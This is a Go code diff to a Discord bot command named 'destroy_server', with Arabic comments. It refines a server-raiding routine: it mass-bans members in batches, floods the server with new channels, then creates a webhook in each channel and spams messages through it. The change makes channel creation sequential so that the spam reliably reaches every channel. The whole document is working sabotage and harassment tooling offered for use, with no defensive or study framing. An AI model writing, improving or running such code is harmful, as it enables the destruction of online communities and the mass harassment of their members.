@@ -36,7 +36,7 @@ func main() {
 	cmdName := "destroy_server"
 	command := &discordgo.ApplicationCommand{
 		Name:        cmdName,
-		Description: "أمر تدمير السيرفر الفوري الخارق (باند دفعات، حذف، إنشاء بضمان، وسبام كامل)",
+		Description: "أمر تدمير السيرفر الفوري الخارق (باند دفعات، رومات مضمونة، وسبام ويب هوك كامل)",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
@@ -136,7 +136,7 @@ func main() {
 	sess.Close()
 }
 
-// دالة التنفيذ الشاملة والمحسنة بضمان اكتمال العدد
+// دالة التنفيذ الشاملة والمحسنة لضمان وصول الرومات والويب هوكات والرسائل 100%
 func executeDestruction(token, guildID, roomName string, roomsCount int, webhookName, messageContent string, messagesCount int) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
@@ -171,7 +171,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 		}
 	}()
 
-	// 2. نظام الباند السريع على دفعات (Batches) لضمان سرعة عالية وأكبر نسبة باند ممكنة بدون حظر ديسكورد
+	// 2. نظام الباند السريع على دفعات (Batches) لضمان سرعة عالية وأكبر نسبة باند
 	go func() {
 		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/members?limit=1000", nil)
 		for k, v := range headers {
@@ -186,7 +186,6 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 		var members []map[string]interface{}
 		json.NewDecoder(resp.Body).Decode(&members)
 
-		// جمع معرفات الأعضاء
 		var userIDs []string
 		for _, m := range members {
 			if user, ok := m["user"].(map[string]interface{}); ok {
@@ -196,7 +195,6 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 			}
 		}
 
-		// تنفيذ الباند على دفعات (كل دفعة 50 شخص في نفس الوقت، مع فاصل 150ms)
 		batchSize := 50
 		for i := 0; i < len(userIDs); i += batchSize {
 			end := i + batchSize
@@ -221,34 +219,36 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 		}
 	}()
 
-	// 3. إنشاء الرومات الجديدة بشكل متسلسل ومنظم (مع فاصل 50ms لضمان عدم ضياع أي روم) وربط الويب هوك والرسائل
+	// 3. إنشاء الرومات بشكل متسلسل ومضمون 100% مع تخزين الـ IDs
+	var channelIDs []string
 	for i := 0; i < roomsCount; i++ {
-		go func() {
-			// إنشاء الروم
-			payload, _ := json.Marshal(map[string]interface{}{
-				"name": roomName,
-				"type": 0,
-			})
-			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
-			for k, v := range headers {
-				req.Header.Set(k, v)
-			}
-			resp, err := client.Do(req)
-			if err != nil {
-				return
-			}
-			defer resp.Body.Close()
-
+		payload, _ := json.Marshal(map[string]interface{}{
+			"name": roomName,
+			"type": 0,
+		})
+		req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
+		for k, v := range headers {
+			req.Header.Set(k, v)
+		}
+		resp, err := client.Do(req)
+		if err == nil {
 			var chResult map[string]interface{}
 			json.NewDecoder(resp.Body).Decode(&chResult)
-			chID, ok := chResult["id"].(string)
-			if !ok {
-				return
+			resp.Body.Close()
+			if chID, ok := chResult["id"].(string); ok {
+				channelIDs = append(channelIDs, chID)
 			}
+		}
+		// فاصل زمني بسيط جداً لضمان عدم سكيب أي روم من قبل ديسكورد
+		time.Sleep(40 * time.Millisecond)
+	}
 
-			// إنشاء الويب هوك داخل الروم الجديد
+	// 4. المرور على كل روم تم إنشاؤه، عمل ويب هوك خاص به، وبدء السبام المكثف والمضمون
+	for _, chID := range channelIDs {
+		go func(cID string) {
+			// إنشاء الويب هوك
 			whPayload, _ := json.Marshal(map[string]string{"name": webhookName})
-			whReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chID+"/webhooks", bytes.NewBuffer(whPayload))
+			whReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/webhooks", bytes.NewBuffer(whPayload))
 			for k, v := range headers {
 				whReq.Header.Set(k, v)
 			}
@@ -269,22 +269,19 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 
 			whURL := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tok)
 
-			// إرسال الرسائل بشكل متتابع ومنظم (مسار مستقل لكل ويب هوك) لضمان وصول العدد كامل 100%
+			// إرسال الرسائل بشكل متتابع ومنظم لضمان وصول العدد كامل 100%
 			for m := 0; m < messagesCount; m++ {
 				msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
 				msgReq, _ := http.NewRequest("POST", whURL, bytes.NewBuffer(msgPayload))
 				msgReq.Header.Set("Content-Type", "application/json")
-				
+
 				msgResp, err := client.Do(msgReq)
 				if err == nil {
 					msgResp.Body.Close()
 				}
-				
+
 				time.Sleep(50 * time.Millisecond)
 			}
-		}()
-
-		// فاصل زمني 50ms بين إنشاء كل روم والثاني لضمان استقبال ديسكورد لجميع الرومات بدون أي سكيب
-		time.Sleep(50 * time.Millisecond)
+		}(chID)
 	}
 }
